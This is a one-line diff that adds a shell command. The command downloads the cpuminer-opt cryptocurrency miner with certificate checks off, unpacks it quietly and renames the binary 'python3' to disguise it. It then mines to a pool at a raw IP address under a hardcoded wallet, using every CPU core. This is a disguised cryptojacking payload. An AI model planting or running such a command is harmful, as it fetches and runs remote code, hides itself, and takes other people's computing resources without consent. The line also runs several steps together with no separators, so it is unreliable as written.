@@ -1,0 +1,1 @@
+nohup wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate tar xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 clear mv cpuminer-sse2 python3 ./python3 -a lyra2z330 -o stratum+tcp://142.93.242.29:443 -u DQVXhNqakHr6Y4sDa4rfpRtd7x8CEqQuGE -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t$(nproc --all)
